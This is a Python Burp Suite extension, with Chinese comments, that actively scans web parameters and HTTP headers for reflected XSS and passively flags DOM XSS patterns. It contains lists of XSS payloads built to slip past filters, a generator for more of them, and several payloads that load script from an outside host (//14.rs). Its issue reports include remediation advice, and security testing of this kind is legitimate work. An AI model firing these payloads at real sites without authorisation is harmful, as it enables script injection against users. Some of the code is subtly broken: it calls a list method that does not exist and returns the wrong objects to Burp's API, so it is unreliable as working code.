# -*- coding: utf-8 -*-
"""
XSS 漏洞扫描模块 - Burp Suite 扩展

移植自 XssFleet (https://github.com/jhli07/XssFleet) 的核心检测算法，
集成 XSStrike 风格的上下文分析和 payload 生成。

三种检测方式：
1. 反射型 XSS：注入标记字符串，分析反射点上下文，自动生成 payload
2. HTTP Header XSS：对 Referer / User-Agent / X-Forwarded-For 等注入
3. DOM XSS 静态分析：检测响应 JS 中的 sink + source 组合

加载方式：
  Burp Suite -> Extensions -> Add -> Extension type: Python -> 选择此文件
需要 Jython 2.7 环境。
"""

from burp import IScanIssue
import re
import random

# ============================================================
# XSStrike 风格配置
# ============================================================

XSSCHECKER = 'v3dm0s'

badTags = ('iframe', 'title', 'textarea', 'noembed', 'style', 'template', 'noscript')
tags = ('html', 'd3v', 'a', 'details')

jFillings = (';', )
lFillings = ('', '%0dx')
eFillings = ('%09', '%0a', '%0d', '+')
fillings = ('%09', '%0a', '%0d', '/+/')

eventHandlers = {
    'ontoggle': ['details'],
    'onpointerenter': ['d3v', 'details', 'html', 'a'],
    'onmouseover': ['a', 'html', 'd3v']
}

functions = (
    '[8].find(confirm)', 'confirm()',
    '(confirm)()', 'confirm()',
    '(prompt)``', 'a=prompt,a()')

# XSStrike 经典 payloads
XSSTRIKE_PAYLOADS = (
    '\'"</Script><Html Onmouseover=(confirm)()//',
    '<imG/sRc=l oNerrOr=(prompt)() x>',
    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
    '<deTails open oNToggle=confirm()>',
    '<img sRc=l oNerrOr=(confirm)() x>',
    '<svg/x=">"/onload=confirm()//',
    '<svg%0Aonload=%09((prompt))()//',
    '<iMg sRc=x:confirm`` oNlOad=eval(src)>',
    '<sCript x>confirm``</scRipt x>',
    '<Script x>prompt()</scRiPt x>',
    '<sCriPt sRc=//14.rs>',
    '<embed//sRc=//14.rs>',
    '<base href=//14.rs/><script src=/>',
    '<object//data=//14.rs>',
    '<s=" onclick=confirm``>clickme',
    '<svG oNLoad=confirm&#x28;1&#x29>',
    '\'"><y///oNMousEDown=((confirm))()>Click',
    '<a/href=javascript&colon;confirm&#40;&quot;1&quot;&#41;>clickme</a>',
    '<img src=x onerror=confirm`1`>',
    '<svg/onload=confirm`1`>',
)

# xss-labs 经典 payloads
CURATED_PAYLOADS = [
    ('"><script>alert()</script>', 11, 'html'),
    ('" onmouseover=alert(1) "', 11, 'attribute'),
    ("' onfocus=javascript:alert() '", 11, 'attribute'),
    ('" onfocus=javascript:alert() "', 11, 'attribute'),
    ('"><a href=javascript:alert()>a</a>', 11, 'html'),
    ('"><ScRipt>alert()</ScriPt>', 11, 'html'),
    ('"><SVG ONLOAD=alert()>', 11, 'html'),
    ('"><IMG SRC=x ONERROR=alert()>', 11, 'html'),
    ('"><oonnmouseover=alert(1)>', 10, 'attribute'),
    ('"><scscriptript>alert()</scscriptript>', 10, 'html'),
    ('&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;', 11, 'url_param'),
    ('" onfocus=javascript:alert() type="text', 11, 'attribute'),
    ('" onmouseover=alert() type="text', 11, 'attribute'),
]

# DOM XSS sinks
DOM_SINKS = [
    'innerHTML', 'outerHTML', 'document.write', 'document.writeln',
    'eval', 'setTimeout', 'setInterval', 'Function',
    'location.href', 'location.hash', 'location.replace', 'location.assign',
    'document.URL', 'window.open', 'document.cookie',
    'insertAdjacentHTML', 'createContextualFragment'
]

DOM_SOURCES = [
    'location.search', 'location.hash', 'location.href',
    'document.referrer', 'window.name',
    'localStorage.getItem', 'sessionStorage.getItem'
]

# HTTP Header XSS 测试列表
HEADER_XSS_TARGETS = [
    "Referer",
    "User-Agent",
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Originating-IP",
    "X-Remote-Addr",
    "X-Client-IP",
    "Client-IP",
    "True-Client-IP",
    "X-Forwarded-Host",
]

# ============================================================
# 上下文解析（移植自 XssFleet htmlParser）
# ============================================================

def _extract_scripts(html):
    """从 HTML 中提取 script 标签内容"""
    scripts = []
    pattern = r'<script[^>]*>([\s\S]*?)</script>'
    for match in re.finditer(pattern, html, re.IGNORECASE):
        scripts.append(match.group(1))
    return scripts


def _escaped(index, string):
    """检查 index 位置的字符是否被转义"""
    count = 0
    i = index - 1
    while i >= 0 and string[i] == '\\':
        count += 1
        i -= 1
    return count % 2 == 1


def _is_bad_context(position, non_executable_contexts):
    """检查 position 是否在不可执行上下文中"""
    for ctx in non_executable_contexts:
        if ctx[0] <= position <= ctx[1]:
            return ctx[2]
    return ''


def html_parser(response_text):
    """
    XSStrike 风格的 HTML 上下文解析器。
    分析 checker 字符串在响应中的位置和上下文。

    返回 dict: {position: {'position': int, 'context': str, 'details': dict}}
    """
    xsschecker = XSSCHECKER

    reflections = response_text.count(xsschecker)
    if reflections == 0:
        return {}

    position_and_context = {}
    environment_details = {}

    # 去掉注释
    clean_response = re.sub(r'<!--[\s\S]*?-->', '', response_text)

    # 检查 script 上下文
    for script in _extract_scripts(clean_response):
        occurences = re.finditer(r'(%s.*?)$' % re.escape(xsschecker), script, re.MULTILINE)
        for occurence in occurences:
            this_position = occurence.start(1)
            position_and_context[this_position] = 'script'
            environment_details[this_position] = {'details': {'quote': ''}}
            for i in range(len(occurence.group())):
                current_char = occurence.group()[i]
                if current_char in ('/', '\'', '`', '"') and not _escaped(i, occurence.group()):
                    environment_details[this_position]['details']['quote'] = current_char
                elif current_char in (')', ']', '}') and not _escaped(i, occurence.group()):
                    break
            clean_response = clean_response.replace(xsschecker, '', 1)

    # 检查 attribute 上下文
    if len(position_and_context) < reflections:
        attribute_context = re.finditer(r'<[^>]*?(%s)[^>]*?>' % re.escape(xsschecker), clean_response)
        for occurence in attribute_context:
            match = occurence.group(0)
            this_position = occurence.start(1)
            parts = re.split(r'\s', match)
            tag = parts[0][1:] if parts else ''

            for part in parts:
                if xsschecker in part:
                    Type = ''
                    quote = ''
                    name = ''
                    value = ''
                    if '=' in part:
                        match_quote = re.search(r"=([\'\"`])?", part)
                        quote = match_quote.group(1) if match_quote and match_quote.group(1) else ''
                        parts_split = part.split('=', 1)
                        name_and_value = (parts_split[0], parts_split[1] if len(parts_split) > 1 else '')
                        if xsschecker == name_and_value[0]:
                            Type = 'name'
                        else:
                            Type = 'value'
                        name = name_and_value[0]
                        value = name_and_value[1].rstrip('>').rstrip(quote or '').lstrip(quote or '') if name_and_value[1] else ''
                    else:
                        Type = 'flag'

                    position_and_context[this_position] = 'attribute'
                    environment_details[this_position] = {
                        'details': {
                            'tag': tag,
                            'type': Type,
                            'quote': quote,
                            'value': value,
                            'name': name
                        }
                    }

    # 检查 HTML 上下文
    if len(position_and_context) < reflections:
        html_context = re.finditer(re.escape(xsschecker), clean_response)
        for occurence in html_context:
            this_position = occurence.start()
            if this_position not in position_and_context:
                position_and_context[this_position] = 'html'
                environment_details[this_position] = {'details': {}}

    # 检查 comment 上下文
    if len(position_and_context) < reflections:
        comment_context = re.finditer(
            r'<!--[\s\S]*?(%s)[\s\S]*?-->' % re.escape(xsschecker),
            response_text
        )
        for occurence in comment_context:
            this_position = occurence.start(1)
            if this_position not in position_and_context:
                position_and_context[this_position] = 'comment'
                environment_details[this_position] = {'details': {}}

    database = {}
    for i in sorted(position_and_context):
        database[i] = {
            'position': i,
            'context': position_and_context[i],
            'details': environment_details.get(i, {}).get('details', {})
        }

    # 检查 badTag 上下文
    bad_contexts = re.finditer(
        r'(?s)(?i)<(style|template|textarea|title|noembed|noscript)>[\s\S]*?(%s)[\s\S]*?</\1>' % re.escape(xsschecker),
        response_text
    )
    non_executable_contexts = []
    for each in bad_contexts:
        non_executable_contexts.append([each.start(), each.end(), each.group(1)])

    if non_executable_contexts:
        for key in database.keys():
            position = database[key]['position']
            bad_tag = _is_bad_context(position, non_executable_contexts)
            database[key]['details']['badTag'] = bad_tag if bad_tag else ''

    return database


# ============================================================
# Payload 生成（移植自 XssFleet genGen）
# ============================================================

def _random_upper(string):
    """随机大小写"""
    result = []
    for c in string:
        if random.random() > 0.5:
            result.append(c.upper())
        else:
            result.append(c)
    return ''.join(result)


def _gen_gen(fillings_list, e_fillings, l_fillings, event_handlers, tag_list, func_list, ends, bad_tag=''):
    """组合生成 payload"""
    payloads = set()
    for tag in tag_list:
        if tag == bad_tag:
            continue
        for event in event_handlers:
            if tag in event_handlers[event]:
                for e_filling in e_fillings:
                    for l_filling in l_fillings:
                        for filling in fillings_list:
                            for function in func_list:
                                for end in ends:
                                    payload = '<%s%s%s%s=%s%s%s' % (
                                        tag, filling, event, e_filling, function, l_filling, end)
                                    payloads.add(payload)
    return list(payloads)


def _generate_payloads_for_context(occurences, response_text):
    """根据检测到的上下文生成 payload"""
    scripts = _extract_scripts(response_text)
    index = 0
    vectors = {11: set(), 10: set(), 9: set(), 8: set(), 7: set(),
               6: set(), 5: set(), 4: set(), 3: set(), 2: set(), 1: set()}

    for i in occurences:
        context = occurences[i]['context']

        if context == 'html':
            bad_tag = occurences[i]['details'].get('badTag', '')
            payload_list = _gen_gen(fillings, eFillings, lFillings,
                                    eventHandlers, tags, functions, ['//', '>'], bad_tag)
            for payload in payload_list:
                vectors[10].add(payload)

        elif context == 'attribute':
            tag = occurences[i]['details'].get('tag', '')
            quote = occurences[i]['details'].get('quote', '')

            payload_list = _gen_gen(fillings, eFillings, lFillings,
                                    eventHandlers, tags, functions, ['//', '>'])
            for payload in payload_list:
                if quote:
                    payload = quote + '>' + payload
                vectors[9].add(payload)

            if quote:
                for filling in fillings:
                    for func in functions:
                        vector = '%s%s%s%s=%s%s' % (
                            quote, filling, _random_upper('autofocus'),
                            filling, _random_upper('onfocus'), func)
                        vectors[8].add(vector)

        elif context == 'script':
            if scripts:
                try:
                    script = scripts[index]
                except IndexError:
                    script = scripts[0]
            else:
                continue

            payload_list = _gen_gen(fillings, eFillings, lFillings,
                                    eventHandlers, tags, functions, ['//', '>'])
            for payload in payload_list:
                vectors[10].add(payload)
            index += 1

    # 添加经典 payloads
    for payload, priority, ctx in CURATED_PAYLOADS:
        vectors[priority].add(payload)

    # 添加 XSStrike payloads
    for payload in XSSTRIKE_PAYLOADS:
        vectors[10].add(payload)

    # 按优先级排序
    all_payloads = []
    for priority in sorted(vectors.keys(), reverse=True):
        for payload in vectors[priority]:
            if priority >= 8:
                all_payloads.append({
                    'payload': payload,
                    'priority': priority,
                    'context': _infer_context(payload)
                })

    return all_payloads


def _infer_context(payload):
    """从 payload 推断上下文"""
    lower = payload.lower()
    if '<script' in lower:
        return 'html'
    elif 'onmouseover' in lower or 'onfocus' in lower or 'ontoggle' in lower:
        return 'attribute'
    elif 'javascript:' in lower:
        return 'url_param'
    return 'html'


# ============================================================
# 主扫描函数
# ============================================================

def do_xss_scan(burp_callbacks, base_request_response):
    """
    对请求执行 XSS 主动扫描。
    对每个参数注入 checker，分析上下文，生成 payload 并测试反射。
    返回 ScannerIssue 列表。
    """
    issues = []
    helpers = burp_callbacks.getHelpers()
    request_info = helpers.analyzeRequest(base_request_response)
    url = request_info.getUrl()
    headers = list(request_info.getHeaders())
    body_bytes = base_request_response.getRequest()[request_info.getBodyOffset():]

    # 获取原始响应
    orig_resp = base_request_response.getResponse()
    orig_body = ''
    try:
        if orig_resp:
            orig_body = orig_resp.toString('UTF-8')
    except:
        pass

    # 获取所有参数
    params = request_info.getParameters()
    if not params:
        return issues

    for param in params:
        param_name = param.getName()
        param_value = param.getValue()
        param_type = param.getType()  # 0=URL, 1=BODY, 2=COOKIE, ...

        try:
            # 步骤1: 注入 checker 探测反射点
            test_request = _build_request_with_param(
                helpers, base_request_response, param, XSSCHECKER)
            test_resp = burp_callbacks.makeHttpRequest(
                base_request_response.getHttpService(), test_request)

            if not test_resp or not test_resp.getResponse():
                continue

            test_body = test_resp.getResponse().toString('UTF-8')

            # 步骤2: 解析上下文
            occurences = html_parser(test_body)
            if not occurences:
                continue

            # 步骤3: 生成 payload
            payloads = _generate_payloads_for_context(occurences, test_body)
            if not payloads:
                continue

            # 限制每个参数最多测试 10 个 payload
            payloads = payloads[:10]

            # 步骤4: 测试 payload 是否被反射
            for p in payloads:
                payload_str = p['payload']
                payload_request = _build_request_with_param(
                    helpers, base_request_response, param, payload_str)
                payload_resp = burp_callbacks.makeHttpRequest(
                    base_request_response.getHttpService(), payload_request)

                if not payload_resp or not payload_resp.getResponse():
                    continue

                payload_body = payload_resp.getResponse().toString('UTF-8')

                # 检查 payload 是否被反射
                is_reflected = _check_reflection(payload_body, payload_str)

                if is_reflected:
                    severity = 'High' if p['priority'] >= 10 else 'Medium'
                    issue = XSSScanIssue(
                        http_service=base_request_response.getHttpService(),
                        url=url,
                        request=payload_request,
                        response=payload_resp.getResponse(),
                        param_name=param_name,
                        param_type=_param_type_name(param_type),
                        payload=payload_str,
                        context=p['context'],
                        severity=severity,
                        helpers=helpers
                    )
                    issues.append(issue)
                    # 该参数发现一个漏洞就够了
                    break

        except Exception as e:
            burp_callbacks.printError('XSS scan error for param %s: %s' % (param_name, str(e)))
            continue

    # HTTP Header XSS 扫描
    header_issues = _scan_header_xss(burp_callbacks, base_request_response, helpers, url, headers, body_bytes)
    issues.extend(header_issues)

    return issues


def _scan_header_xss(burp_callbacks, base_request_response, helpers, url, headers, body_bytes):
    """对 HTTP Header 注入 XSS payload"""
    issues = []
    xss_payload = '<script>alert(1)</script>'

    for header_name in HEADER_XSS_TARGETS:
        try:
            # 构造注入了 XSS payload 的 header
            test_headers = list(headers)
            found = False
            for i, h in enumerate(test_headers):
                if h.lower().startswith(header_name.lower() + ':'):
                    colon_pos = h.index(':')
                    test_headers[i] = h[:colon_pos + 1] + ' ' + xss_payload
                    found = True
                    break
            if not found:
                test_headers.add(header_name + ': ' + xss_payload)

            test_request = helpers.buildHttpMessage(test_headers, body_bytes)
            test_resp = burp_callbacks.makeHttpRequest(
                base_request_response.getHttpService(), test_request)

            if not test_resp or not test_resp.getResponse():
                continue

            test_body = test_resp.getResponse().toString('UTF-8')

            if xss_payload in test_body:
                issue = XSSScanIssue(
                    http_service=base_request_response.getHttpService(),
                    url=url,
                    request=test_request,
                    response=test_resp.getResponse(),
                    param_name='Header: ' + header_name,
                    param_type='HTTP Header',
                    payload=xss_payload,
                    context='http_header',
                    severity='High',
                    helpers=helpers
                )
                issues.append(issue)
        except Exception as e:
            burp_callbacks.printError('Header XSS scan error for %s: %s' % (header_name, str(e)))
            continue

    return issues


def do_xss_passive_scan(burp_callbacks, base_request_response):
    """
    被动扫描：检测 DOM XSS 特征。
    检查响应 JS 中是否存在 sink + source 组合。
    返回 ScannerIssue 列表。
    """
    issues = []
    helpers = burp_callbacks.getHelpers()

    response = base_request_response.getResponse()
    if not response:
        return None

    try:
        body = response.toString('UTF-8')
    except:
        return None

    # 从响应中提取 script 内容
    scripts = _extract_scripts(body)
    if not scripts:
        return None

    found_sinks = []
    found_sources = []

    for script in scripts:
        for sink in DOM_SINKS:
            if sink in script:
                found_sinks.append(sink)
        for source in DOM_SOURCES:
            if source in script:
                found_sources.append(source)

    if found_sinks and found_sources:
        request_info = helpers.analyzeRequest(base_request_response)
        url = request_info.getUrl()

        # 去重
        unique_sinks = list(set(found_sinks))
        unique_sources = list(set(found_sources))

        detail = (
            'The response contains JavaScript code with potential DOM-based XSS patterns.\n\n'
            '<b>Sinks (dangerous functions):</b> %s\n\n'
            '<b>Sources (user-controlled input):</b> %s\n\n'
            'If user input flows from a source to a sink without proper sanitization, '
            'this may result in a DOM-based XSS vulnerability.'
        ) % (', '.join(unique_sinks), ', '.join(unique_sources))

        issue = DOMXSSHintIssue(
            http_service=base_request_response.getHttpService(),
            url=url,
            request=base_request_response.getRequest(),
            response=response,
            sinks=unique_sinks,
            sources=unique_sources,
            detail=detail,
            helpers=helpers
        )
        issues.append(issue)

    return issues if issues else None


# ============================================================
# 工具函数
# ============================================================

def _build_request_with_param(helpers, base_request_response, param, value):
    """用新值替换参数并构建请求"""
    return helpers.updateParameter(
        base_request_response.getRequest(),
        helpers.buildParameter(param.getName(), value, param.getType())
    )


def _check_reflection(response_body, payload):
    """检查 payload 是否在响应中被反射"""
    # 基本检查：payload 整体出现
    if payload in response_body:
        return True

    # 对于 event handler payload，检查关键部分
    lower_payload = payload.lower()
    if 'onmouseover' in lower_payload or 'onfocus' in lower_payload or 'ontoggle' in lower_payload:
        # 检查 event handler 部分是否出现
        event_part = payload.split('=')[0] if '=' in payload else payload
        if event_part.lower() in response_body.lower():
            return True

    # 检查 script 标签
    if '<script' in lower_payload:
        if '<script' in response_body.lower():
            return True

    return False


def _param_type_name(param_type):
    """参数类型转名称"""
    type_map = {0: 'URL', 1: 'BODY', 2: 'COOKIE', 3: 'URL path'}
    return type_map.get(param_type, 'Unknown')


# ============================================================
# IScanIssue 实现
# ============================================================

class XSSScanIssue(IScanIssue):
    """XSS 漏洞扫描结果"""

    def __init__(self, http_service, url, request, response,
                 param_name, param_type, payload, context,
                 severity, helpers):
        self._http_service = http_service
        self._url = url
        self._request = request
        self._response = response
        self._param_name = param_name
        self._param_type = param_type
        self._payload = payload
        self._context = context
        self._severity = severity
        self._helpers = helpers

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return 'XSS Vulnerability (%s) - Parameter: %s' % (self._context, self._param_name)

    def getIssueType(self):
        return 0x08000009  # XSS type

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return 'Certain'

    def getIssueBackground(self):
        return (
            'Cross-site scripting (XSS) allows attackers to inject client-side scripts '
            'into web pages viewed by other users. The application reflects user-controlled '
            'input in the response without proper sanitization or encoding, allowing an '
            'attacker to execute arbitrary JavaScript in the context of the victim\'s browser.'
        )

    def getRemediationBackground(self):
        return (
            'Encode all user-controlled output based on the output context (HTML, attribute, '
            'JavaScript, URL). Implement Content Security Policy (CSP) headers. Use frameworks '
            'that automatically escape output. Validate and sanitize all user input.'
        )

    def getIssueDetail(self):
        return (
            'The scanner detected that the <b>%s</b> parameter (%s) is vulnerable to '
            'cross-site scripting.<br><br>'
            '<b>Context:</b> %s<br>'
            '<b>Payload:</b> <code>%s</code><br><br>'
            'The payload was reflected in the response without proper encoding, '
            'allowing an attacker to execute arbitrary JavaScript code.'
        ) % (self._param_name, self._param_type, self._context, self._payload)

    def getRemediationDetail(self):
        return (
            '1. Encode output based on context: HTML entity encode for HTML body, '
            'JavaScript encode for JS strings, URL encode for URL parameters.\n'
            '2. Implement Content Security Policy (CSP) headers to restrict inline scripts.\n'
            '3. Use HTTPOnly and Secure flags on session cookies.\n'
            '4. Validate input against a whitelist of allowed characters.\n'
            '5. Use template engines with automatic escaping (e.g., Jinja2, React JSX).'
        )

    def getHttpMessages(self):
        return [{
            'request': self._request,
            'response': self._response,
            'httpService': self._http_service,
            'comment': 'XSS payload: %s' % self._payload
        }]

    def getHttpService(self):
        return self._http_service


class DOMXSSHintIssue(IScanIssue):
    """DOM XSS 潜在风险提示"""

    def __init__(self, http_service, url, request, response,
                 sinks, sources, detail, helpers):
        self._http_service = http_service
        self._url = url
        self._request = request
        self._response = response
        self._sinks = sinks
        self._sources = sources
        self._detail = detail
        self._helpers = helpers

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return 'Potential DOM-based XSS (sinks + sources detected)'

    def getIssueType(self):
        return 0x08000009

    def getSeverity(self):
        return 'Information'

    def getConfidence(self):
        return 'Tentative'

    def getIssueBackground(self):
        return (
            'DOM-based XSS occurs when user-controlled input (sources) flows into '
            'dangerous JavaScript functions (sinks) without sanitization. Unlike reflected '
            'or stored XSS, the payload never reaches the server — it is processed entirely '
            'in the client-side JavaScript.'
        )

    def getRemediationBackground(self):
        return (
            'Avoid using innerHTML, document.write, and eval with user-controlled data. '
            'Use textContent instead of innerHTML. Sanitize input with DOMPurify or similar. '
            'Implement CSP to restrict inline script execution.'
        )

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        return (
            '1. Use textContent instead of innerHTML where possible.\n'
            '2. Sanitize user input with DOMPurify before inserting into DOM.\n'
            '3. Avoid eval(), setTimeout(string), setInterval(string) with user data.\n'
            '4. Use URL API to parse URLs instead of string manipulation.\n'
            '5. Implement strict CSP to block inline scripts.'
        )

    def getHttpMessages(self):
        return [{
            'request': self._request,
            'response': self._response,
            'httpService': self._http_service,
            'comment': 'DOM XSS hint: sinks=%s, sources=%s' % (
                ', '.join(self._sinks), ', '.join(self._sources))
        }]

    def getHttpService(self):
        return self._http_service
